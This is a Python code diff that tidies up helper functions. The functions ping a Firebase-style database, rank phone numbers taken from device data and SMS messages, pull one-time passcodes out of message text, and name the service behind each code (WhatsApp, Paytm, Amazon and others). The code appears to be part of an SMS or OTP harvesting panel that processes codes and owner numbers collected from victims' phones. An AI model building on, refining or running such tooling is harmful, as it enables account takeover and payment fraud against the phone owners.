@@ -19,9 +19,7 @@ async def check_ping(url):
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(f"{url}/.json?shallow=true", timeout=3) as resp:
-                if resp.status == 200:
-                    ms = int((time.time() - start) * 1000)
-                    return f"{ms}ms"
+                if resp.status == 200: return f"{int((time.time() - start) * 1000)}ms"
     except Exception: pass
     return "❌ Timeout"
 
@@ -72,30 +70,26 @@ def extract_best_numbers(dev_data, msgs):
     scored_numbers = []
     
     for num, count in counts.items():
-        score = min(count * 10, 50) # Base score from frequency (max 50%)
+        score = min(count * 10, 50) 
         is_carrier = False
         for m in msgs:
             sender = str(m.get("sender", "")).lower()
-            msg_text = m.get("message", "")
-            if num in msg_text:
-                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
-                    is_carrier = True
-                    break
+            if num in m.get("message", "") and any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
+                is_carrier = True
+                break
         
         if is_carrier: score = 100 
-        else: score = min(score + 20, 99) # Add 20% for normal repeat
+        else: score = min(score + 20, 99)
         scored_numbers.append((num, score))
 
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
             n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
-            if len(n) == 10 and n not in bad_numbers:
-                scored_numbers.append((n, 100))
+            if len(n) == 10 and n not in bad_numbers: scored_numbers.append((n, 100))
 
     best_nums = {}
     for n, s in scored_numbers:
         if n not in best_nums or s > best_nums[n]: best_nums[n] = s
-        
     return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2]
 
 def extract_otp(text):
@@ -108,7 +102,5 @@ def extract_service_name(text, sender):
     services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel"}
     for key, name in services.items():
         if key in text_lower: return name
-    if sender:
-        parts = sender.split("-")
-        if len(parts) > 1: return parts[1]
+    if sender and "-" in sender: return sender.split("-")[1]
     return "Unknown"
